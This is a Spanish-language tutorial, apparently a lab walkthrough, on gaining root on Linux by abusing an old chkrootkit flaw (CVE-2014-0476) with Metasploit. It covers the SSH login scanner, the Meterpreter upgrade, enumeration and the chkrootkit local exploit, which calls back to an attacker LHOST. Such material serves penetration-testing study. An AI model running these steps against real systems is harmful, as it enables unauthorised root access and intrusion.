# Escalada de privilegios en Linux explotando programas vulnerables (chkrootkit)

## 1. Objetivo
Explotar un programa instalado en un sistema Linux que contenga una vulnerabilidad conocida para obtener privilegios de root.

En este ejemplo, se utiliza **chkrootkit** como caso práctico.

---

## 2. Flujo de trabajo

### Paso 1: Acceso inicial por SSH con Metasploit
Entramos con un usuario válido en la máquina víctima:
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>
set USERNAME <usuario>
set PASSWORD <contraseña>
exploit
```
Esto nos da una sesión de shell en Metasploit.

---

### Paso 2: Obtener una shell interactiva
En la sesión:
```bash
/bin/bash -i
```
Con esto obtenemos una shell interactiva para ejecutar comandos más cómodamente.

---

### Paso 3: Recolectar información básica del sistema
```bash
cat /etc/*issue
uname -r
```
- `/etc/*issue` → Muestra la distribución y versión de Linux.
- `uname -r` → Muestra la versión del kernel.

Esto nos ayuda a identificar posibles vectores de explotación.

---

### Paso 4: Mejorar la sesión a Meterpreter
Mandamos la sesión al background:
```bash
background
```
Mejoramos a Meterpreter:
```bash
sessions -u 1
```
- `1` es el ID de la sesión actual.

---

### Paso 5: Revisar procesos y binarios
En la sesión Meterpreter:
```bash
ps aux
cat /bin/check-down
```
Esto nos permite inspeccionar scripts o binarios ejecutados por root.

---

### Paso 6: Identificar uso de chkrootkit
Si vemos que `/bin/check-down` llama a `chkrootkit`, verificamos su versión:
```bash
chkrootkit --help
chkrootkit -V
```

**Versiones vulnerables conocidas**:
- 0.49 y anteriores → Vulnerables a ejecución arbitraria de comandos como root.
- Existen vulnerabilidades específicas como **CVE-2014-0476**.

---

### Paso 7: Localizar módulo de explotación en Metasploit
Mandamos la sesión al background:
```bash
background
```
Buscamos el exploit:
```bash
search chkrootkit
```
Usamos el módulo:
```bash
use exploit/unix/local/chkrootkit
```

---

### Paso 8: Configurar el exploit
```bash
set CHKROOTKIT /bin/chkrootkit
set SESSION 2
set LHOST <IP_atacante>
exploit
```
- `CHKROOTKIT` → Ruta del binario vulnerable.
- `SESSION` → ID de la sesión donde se explotará.
- `LHOST` → IP del atacante para recibir la conexión.

---

## 3. ¿Por qué funciona esta escalada?
`chkrootkit` en versiones antiguas ejecuta comandos desde directorios temporales sin saneo de entradas, lo que permite inyectar código que se ejecutará con privilegios de root.

---

## 4. Resumen de comandos clave
```bash
/bin/bash -i
cat /etc/*issue
uname -r
sessions -u 1
ps aux
cat /bin/check-down
chkrootkit --help
chkrootkit -V
search chkrootkit
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION 2
set LHOST <IP>
exploit
```

---

## 5. Recomendaciones
- Siempre verificar versión y ubicación del binario antes de explotar.
- Confirmar que el proceso es ejecutado por root.
- Mantener un acceso de backup antes de lanzar el exploit.
